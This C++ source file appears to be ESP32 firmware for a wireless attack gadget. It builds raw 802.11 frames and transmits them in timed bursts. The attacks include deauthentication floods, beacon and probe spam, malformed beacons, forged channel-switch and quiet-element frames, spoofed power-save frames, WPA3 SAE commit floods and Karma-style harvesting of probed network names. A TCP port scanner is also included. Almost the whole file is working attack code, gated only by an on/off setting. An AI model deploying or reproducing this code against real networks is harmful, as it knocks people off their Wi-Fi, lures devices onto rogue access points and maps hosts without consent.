#include "wifi_attack.h"
#include "config.h"
#include "settings.h"
#include "wifi_recon.h"

#include <WiFi.h>
#include <WiFiClient.h>
#include <esp_wifi.h>
#include <string.h>

namespace {

const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
const uint8_t SUPPORTED_RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};

void randomMac(uint8_t out[6]) {
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)random(0, 256);
  out[0] = (uint8_t)((out[0] & 0xFC) | 0x02);
}

String randomSsid() {
  static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  String s;
  for (int i = 0; i < 8; i++) s += charset[random(0, (int)(sizeof(charset) - 1))];
  return s;
}

const char* const RICKROLL_SSIDS[] = {
  "You Just Got Rick Rolled", "Never Gonna Give This Up", "Nice Try Though",
  "Free WiFi (Not Really)", "Gotcha!", "Fox Was Here",
  "This Is Not A Real Network", "Better Luck Next Time"
};

size_t buildDeauthFrame(uint8_t* buf, const uint8_t destMac[6], const uint8_t bssid[6], uint16_t seq) {
  buf[0] = 0xC0; buf[1] = 0x00;
  buf[2] = 0x00; buf[3] = 0x00;
  memcpy(buf + 4, destMac, 6);
  memcpy(buf + 10, bssid, 6);
  memcpy(buf + 16, bssid, 6);
  buf[22] = (uint8_t)((seq << 4) & 0xFF);
  buf[23] = (uint8_t)((seq >> 4) & 0xFF);
  buf[24] = 0x07; buf[25] = 0x00;
  return 26;
}

size_t buildBeaconFrame(uint8_t* buf, const uint8_t srcMac[6], const String& ssid, uint8_t channel, uint16_t seq) {
  size_t ssidLen = min((size_t)ssid.length(), (size_t)BEACON_SPAM_SSID_LEN_MAX);
  size_t i = 0;
  buf[i++] = 0x80; buf[i++] = 0x00;
  buf[i++] = 0x00; buf[i++] = 0x00;
  memcpy(buf + i, BROADCAST_MAC, 6); i += 6;
  memcpy(buf + i, srcMac, 6); i += 6;
  memcpy(buf + i, srcMac, 6); i += 6;
  buf[i++] = (uint8_t)((seq << 4) & 0xFF);
  buf[i++] = (uint8_t)((seq >> 4) & 0xFF);
  memset(buf + i, 0, 8); i += 8;
  buf[i++] = 0x64; buf[i++] = 0x00;
  buf[i++] = 0x01; buf[i++] = 0x00;
  buf[i++] = 0x00; buf[i++] = (uint8_t)ssidLen;
  memcpy(buf + i, ssid.c_str(), ssidLen); i += ssidLen;
  buf[i++] = 0x01; buf[i++] = 0x08;
  memcpy(buf + i, SUPPORTED_RATES, 8); i += 8;
  buf[i++] = 0x03; buf[i++] = 0x01; buf[i++] = channel;
  return i;
}

size_t buildProbeFrame(uint8_t* buf, const uint8_t srcMac[6], const String& ssid, uint16_t seq) {
  size_t ssidLen = min((size_t)ssid.length(), (size_t)BEACON_SPAM_SSID_LEN_MAX);
  size_t i = 0;
  buf[i++] = 0x40; buf[i++] = 0x00;
  buf[i++] = 0x00; buf[i++] = 0x00;
  memcpy(buf + i, BROADCAST_MAC, 6); i += 6;
  memcpy(buf + i, srcMac, 6); i += 6;
  memcpy(buf + i, BROADCAST_MAC, 6); i += 6;
  buf[i++] = (uint8_t)((seq << 4) & 0xFF);
  buf[i++] = (uint8_t)((seq >> 4) & 0xFF);
  buf[i++] = 0x00; buf[i++] = (uint8_t)ssidLen;
  memcpy(buf + i, ssid.c_str(), ssidLen); i += ssidLen;
  buf[i++] = 0x01; buf[i++] = 0x08;
  memcpy(buf + i, SUPPORTED_RATES, 8); i += 8;
  return i;
}

size_t buildBadPacketFrame(uint8_t* buf, const uint8_t destMac[6], const uint8_t bssid[6], uint16_t seq) {
  size_t i = 0;
  buf[i++] = 0x80; buf[i++] = 0x00;
  buf[i++] = 0x00; buf[i++] = 0x00;
  memcpy(buf + i, destMac, 6); i += 6;
  memcpy(buf + i, bssid, 6); i += 6;
  memcpy(buf + i, bssid, 6); i += 6;
  buf[i++] = (uint8_t)((seq << 4) & 0xFF);
  buf[i++] = (uint8_t)((seq >> 4) & 0xFF);
  memset(buf + i, 0, 8); i += 8;
  buf[i++] = 0x64; buf[i++] = 0x00;
  buf[i++] = 0x01; buf[i++] = 0x00;
  buf[i++] = 0x00; buf[i++] = 32;
  const char* filler = "FOX";
  memcpy(buf + i, filler, 3); i += 3;
  return i;
}

size_t buildCsaFrame(uint8_t* buf, const uint8_t srcMac[6], const String& ssid, uint8_t currentChannel, uint16_t seq) {
  size_t len = buildBeaconFrame(buf, srcMac, ssid, currentChannel, seq);
  buf[len++] = 37; buf[len++] = 3;
  buf[len++] = 1; buf[len++] = WIFI_CSA_TARGET_CHANNEL; buf[len++] = 0;
  return len;
}

size_t buildSleepFrame(uint8_t* buf, const uint8_t staMac[6], const uint8_t bssid[6], uint16_t seq) {
  size_t i = 0;
  buf[i++] = 0x48; buf[i++] = 0x11;
  buf[i++] = 0x00; buf[i++] = 0x00;
  memcpy(buf + i, bssid, 6); i += 6;
  memcpy(buf + i, staMac, 6); i += 6;
  memcpy(buf + i, bssid, 6); i += 6;
  buf[i++] = (uint8_t)((seq << 4) & 0xFF);
  buf[i++] = (uint8_t)((seq >> 4) & 0xFF);
  return i;
}

size_t buildSaeCommitFrame(uint8_t* buf, const uint8_t srcMac[6], const uint8_t bssid[6], uint16_t seq) {
  size_t i = 0;
  buf[i++] = 0xB0; buf[i++] = 0x00;
  buf[i++] = 0x00; buf[i++] = 0x00;
  memcpy(buf + i, bssid, 6); i += 6;
  memcpy(buf + i, srcMac, 6); i += 6;
  memcpy(buf + i, bssid, 6); i += 6;
  buf[i++] = (uint8_t)((seq & 0x0F) << 4);
  buf[i++] = (uint8_t)((seq >> 4) & 0xFF);
  buf[i++] = 0x03; buf[i++] = 0x00;
  buf[i++] = 0x01; buf[i++] = 0x00;
  buf[i++] = 0x00; buf[i++] = 0x00;
  return i;
}

void runSae() {
  uint8_t bssid[6]; uint8_t channel; String ssid;
  if (!FoxWifiRecon::getSelectedAp(bssid, &channel, &ssid)) {
    Serial.println("ERROR:NOAPSELECTED"); return;
  }
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[30]; uint8_t srcMac[6]; uint16_t seq = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)ATTACK_BURST_SECONDS * 1000UL) {
    randomMac(srcMac);
    size_t len = buildSaeCommitFrame(frame, srcMac, bssid, seq++);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    delay(ATTACK_PACKET_INTERVAL_MS);
  }
  Serial.println("ATTACKDONE");
}

void runQuietTime() {
  uint8_t bssid[6]; uint8_t channel; String ssid;
  if (!FoxWifiRecon::getSelectedAp(bssid, &channel, &ssid)) {
    Serial.println("ERROR:NOAPSELECTED"); return;
  }
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[90 + BEACON_SPAM_SSID_LEN_MAX]; uint16_t seq = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)ATTACK_BURST_SECONDS * 1000UL) {
    size_t len = buildBeaconFrame(frame, bssid, ssid, channel, seq++);
    frame[len++] = 0x28; frame[len++] = 0x06;
    frame[len++] = 0x01; frame[len++] = 0x00;
    frame[len++] = 0xFF; frame[len++] = 0xFF;
    frame[len++] = 0x00; frame[len++] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    delay(ATTACK_PACKET_INTERVAL_MS);
  }
  Serial.println("ATTACKDONE");
}

static char g_karmaSsids[BEACON_SPAM_SSID_MAX][BEACON_SPAM_SSID_LEN_MAX + 1];
static volatile int g_karmaCount = 0;

void IRAM_ATTR karmaProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  auto* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* d = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 26) return;
  if (d[0] != 0x40) return;
  if (d[24] != 0x00) return;
  uint8_t ssidLen = d[25];
  if (ssidLen == 0 || ssidLen > BEACON_SPAM_SSID_LEN_MAX) return;
  if (26 + (int)ssidLen > len) return;
  int n = g_karmaCount;
  for (int i = 0; i < n; i++) {
    bool match = true;
    for (int j = 0; j < (int)ssidLen; j++) {
      if (g_karmaSsids[i][j] != (char)d[26 + j]) { match = false; break; }
    }
    if (match && g_karmaSsids[i][ssidLen] == '\0') return;
  }
  if (n >= BEACON_SPAM_SSID_MAX) return;
  for (int j = 0; j < (int)ssidLen; j++) g_karmaSsids[n][j] = (char)d[26 + j];
  g_karmaSsids[n][ssidLen] = '\0';
  g_karmaCount = n + 1;
}

void runBeaconSpamList(String* ssids, int count);

void runKarma() {
  g_karmaCount = 0;
  esp_wifi_set_promiscuous_rx_cb(&karmaProbeCallback);
  esp_wifi_set_promiscuous(true);
  Serial.print("KARMA:SNIFFING:");
  Serial.println(WIFI_KARMA_SNIFF_SECONDS);
  unsigned long start = millis();
  while (millis() - start < (unsigned long)WIFI_KARMA_SNIFF_SECONDS * 1000UL) delay(50);
  esp_wifi_set_promiscuous(false);
  int n = g_karmaCount;
  Serial.print("KARMA:COLLECTED:"); Serial.println(n);
  if (n == 0) { Serial.println("ATTACKDONE"); return; }
  String ssids[BEACON_SPAM_SSID_MAX];
  for (int i = 0; i < n; i++) ssids[i] = String(g_karmaSsids[i]);
  runBeaconSpamList(ssids, n);
}

bool refuseIfDisabled() {
  if (!FoxSettings::attacksEnabled()) { Serial.println("ERROR:DISABLED"); return true; }
  return false;
}

void runDeauth(const uint8_t destMac[6]) {
  uint8_t bssid[6]; uint8_t channel; String ssid;
  if (!FoxWifiRecon::getSelectedAp(bssid, &channel, &ssid)) {
    Serial.println("ERROR:NOAPSELECTED"); return;
  }
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[26]; uint16_t seq = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)ATTACK_BURST_SECONDS * 1000UL) {
    size_t len = buildDeauthFrame(frame, destMac, bssid, seq++);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    delay(ATTACK_PACKET_INTERVAL_MS);
  }
  Serial.println("ATTACKDONE");
}

void runBeaconSpamList(String* ssids, int count) {
  if (count == 0) { Serial.println("ERROR:NOSSIDS"); return; }
  uint8_t frame[64 + BEACON_SPAM_SSID_LEN_MAX];
  uint8_t srcMac[6]; uint16_t seq = 0; int idx = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)ATTACK_BURST_SECONDS * 1000UL) {
    randomMac(srcMac);
    size_t len = buildBeaconFrame(frame, srcMac, ssids[idx % count], 1, seq++);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    idx++;
    delay(ATTACK_PACKET_INTERVAL_MS);
  }
  Serial.println("ATTACKDONE");
}

void runBeaconSpam(const String& ssidListRaw) {
  String ssids[BEACON_SPAM_SSID_MAX];
  int count = 0;
  if (ssidListRaw.startsWith("RANDOM:")) {
    int n = ssidListRaw.substring(7).toInt();
    if (n < 1) n = 1;
    if (n > BEACON_SPAM_SSID_MAX) n = BEACON_SPAM_SSID_MAX;
    for (int i = 0; i < n; i++) ssids[count++] = randomSsid();
  } else {
    String rest = ssidListRaw;
    while (rest.length() > 0 && count < BEACON_SPAM_SSID_MAX) {
      int comma = rest.indexOf(',');
      String one = (comma < 0) ? rest : rest.substring(0, comma);
      one.trim();
      if (one.length() > 0) ssids[count++] = one;
      if (comma < 0) break;
      rest = rest.substring(comma + 1);
    }
  }
  runBeaconSpamList(ssids, count);
}

void runSleep() {
  uint8_t bssid[6]; uint8_t channel; String ssid; uint8_t staMac[6];
  if (!FoxWifiRecon::getSelectedAp(bssid, &channel, &ssid)) {
    Serial.println("ERROR:NOAPSELECTED"); return;
  }
  if (!FoxWifiRecon::getSelectedSta(staMac)) {
    Serial.println("ERROR:NOSTASELECTED"); return;
  }
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[24]; uint16_t seq = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)ATTACK_BURST_SECONDS * 1000UL) {
    size_t len = buildSleepFrame(frame, staMac, bssid, seq++);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    delay(ATTACK_PACKET_INTERVAL_MS);
  }
  Serial.println("ATTACKDONE");
}

void runCsa() {
  uint8_t bssid[6]; uint8_t channel; String ssid;
  if (!FoxWifiRecon::getSelectedAp(bssid, &channel, &ssid)) {
    Serial.println("ERROR:NOAPSELECTED"); return;
  }
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[64 + BEACON_SPAM_SSID_LEN_MAX + 5]; uint16_t seq = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)ATTACK_BURST_SECONDS * 1000UL) {
    size_t len = buildCsaFrame(frame, bssid, ssid, channel, seq++);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    delay(ATTACK_PACKET_INTERVAL_MS);
  }
  Serial.println("ATTACKDONE");
}

void runBadPacket() {
  uint8_t bssid[6]; uint8_t channel; String ssid;
  if (!FoxWifiRecon::getSelectedAp(bssid, &channel, &ssid)) {
    Serial.println("ERROR:NOAPSELECTED"); return;
  }
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[48]; uint16_t seq = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)ATTACK_BURST_SECONDS * 1000UL) {
    size_t len = buildBadPacketFrame(frame, BROADCAST_MAC, bssid, seq++);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    delay(ATTACK_PACKET_INTERVAL_MS);
  }
  Serial.println("ATTACKDONE");
}

void runRickroll() {
  int count = (int)(sizeof(RICKROLL_SSIDS) / sizeof(RICKROLL_SSIDS[0]));
  String ssids[count];
  for (int i = 0; i < count; i++) ssids[i] = String(RICKROLL_SSIDS[i]);
  runBeaconSpamList(ssids, count);
}

void runProbeFlood() {
  uint8_t frame[64]; uint8_t srcMac[6]; uint16_t seq = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)ATTACK_BURST_SECONDS * 1000UL) {
    randomMac(srcMac);
    size_t len = buildProbeFrame(frame, srcMac, "", seq++);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    delay(ATTACK_PACKET_INTERVAL_MS);
  }
  Serial.println("ATTACKDONE");
}

int runPortScan(const String& ip, int startPort, int endPort) {
  IPAddress target;
  if (!target.fromString(ip)) { Serial.println("ERROR:BADIP"); return -1; }
  if (startPort < 1) startPort = 1;
  if (endPort > 65535) endPort = 65535;
  if (endPort < startPort) { Serial.println("ERROR:BADRANGE"); return -1; }
  if (endPort - startPort + 1 > WIFI_PORTSCAN_MAX_PORTS)
    endPort = startPort + WIFI_PORTSCAN_MAX_PORTS - 1;
  int openCount = 0;
  for (int port = startPort; port <= endPort; port++) {
    WiFiClient client;
    if (client.connect(target, (uint16_t)port, WIFI_PORTSCAN_TIMEOUT_MS)) {
      Serial.print("PORTOPEN:"); Serial.println(port);
      openCount++;
      client.stop();
    }
  }
  Serial.println("PORTSCANDONE");
  return openCount;
}

}

namespace FoxWifiAttack {

bool handleCommand(const String& line) {
  if (line == "WIFIATTACK:DEAUTH") {
    if (refuseIfDisabled()) return true;
    runDeauth(BROADCAST_MAC); return true;
  }
  if (line.startsWith("WIFIATTACK:DEAUTH:")) {
    if (refuseIfDisabled()) return true;
    String macStr = line.substring(19); macStr.trim();
    uint8_t mac[6]; unsigned int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) != 6) {
      Serial.println("ERROR:BADMAC"); return true;
    }
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
    runDeauth(mac); return true;
  }
  if (line.startsWith("WIFIATTACK:BEACON:")) {
    if (refuseIfDisabled()) return true;
    runBeaconSpam(line.substring(19)); return true;
  }
  if (line == "WIFIATTACK:PROBE") { if (refuseIfDisabled()) return true; runProbeFlood(); return true; }
  if (line == "WIFIATTACK:RICKROLL") { if (refuseIfDisabled()) return true; runRickroll(); return true; }
  if (line == "WIFIATTACK:BADPACKET") { if (refuseIfDisabled()) return true; runBadPacket(); return true; }
  if (line == "WIFIATTACK:CSA") { if (refuseIfDisabled()) return true; runCsa(); return true; }
  if (line == "WIFIATTACK:SLEEP") { if (refuseIfDisabled()) return true; runSleep(); return true; }
  if (line == "WIFIATTACK:SAE") { if (refuseIfDisabled()) return true; runSae(); return true; }
  if (line == "WIFIATTACK:QUIET") { if (refuseIfDisabled()) return true; runQuietTime(); return true; }
  if (line == "WIFIATTACK:KARMA") { if (refuseIfDisabled()) return true; runKarma(); return true; }

  if (line.startsWith("WIFIPORTSCAN:")) {
    if (refuseIfDisabled()) return true;
    String rest = line.substring(strlen("WIFIPORTSCAN:"));
    int c1 = rest.indexOf(':');
    int c2 = (c1 < 0) ? -1 : rest.indexOf(':', c1 + 1);
    if (c1 < 0 || c2 < 0) { Serial.println("ERROR:BADFORMAT"); return true; }
    String ip = rest.substring(0, c1);
    int startPort = rest.substring(c1 + 1, c2).toInt();
    int endPort = rest.substring(c2 + 1).toInt();
    runPortScan(ip, startPort, endPort);
    return true;
  }

  return false;
}

bool scriptDeauth() {
  if (!FoxSettings::attacksEnabled()) return false;
  uint8_t bssid[6]; uint8_t channel; String ssid;
  if (!FoxWifiRecon::getSelectedAp(bssid, &channel, &ssid)) return false;
  runDeauth(BROADCAST_MAC);
  return true;
}

bool scriptBeaconSpam(const String& ssidArg) {
  if (!FoxSettings::attacksEnabled()) return false;
  if (ssidArg.length() == 0) return false;
  runBeaconSpam(ssidArg);
  return true;
}

int scriptPortScan(const String& ip, int startPort, int endPort) {
  if (!FoxSettings::attacksEnabled()) return -1;
  return runPortScan(ip, startPort, endPort);
}

}
